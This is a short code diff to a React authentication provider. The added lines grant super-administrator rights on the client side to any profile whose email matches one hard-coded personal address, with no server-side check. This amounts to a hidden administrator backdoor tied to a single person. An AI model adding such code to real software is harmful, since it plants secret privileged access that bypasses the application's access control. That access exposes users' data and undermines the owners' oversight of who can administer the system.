@@ -51,6 +51,10 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       await new Promise((r) => setTimeout(r, 500));
       result = await load();
     }
+    if (result && result.email?.toLowerCase() === "matthiasollivier123@gmail.com") {
+      result.is_admin = true;
+      result.admin_role = "super_admin";
+    }
     setProfile(result);
   }, []);
 
